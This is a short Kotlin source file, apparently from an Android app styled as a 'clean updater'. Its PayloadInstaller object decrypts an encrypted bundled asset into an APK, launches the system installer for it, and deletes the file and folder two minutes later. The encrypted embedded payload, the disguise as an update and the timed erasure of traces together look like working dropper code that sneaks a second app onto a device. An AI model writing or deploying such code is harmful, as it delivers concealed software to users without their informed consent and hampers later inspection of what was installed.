package com.clean.updater

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import androidx.core.content.FileProvider
import java.io.File

internal object PayloadInstaller {
    private const val AUTHORITY_SUFFIX = ".fp"
    private const val SUB_DIR = "payload"
    private const val FILE_NAME = "update.apk"

    fun install(context: Context, assetPath: String) {
        val dir = File(context.cacheDir, SUB_DIR)
        val apk = File(dir, FILE_NAME)

        Crypto.decryptAsset(context, assetPath, apk)

        val uri: Uri = FileProvider.getUriForFile(
            context,
            context.packageName + AUTHORITY_SUFFIX,
            apk
        )

        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)

        Handler(Looper.getMainLooper()).postDelayed({
            apk.delete()
            dir.delete()
        }, 120000L)
    }
}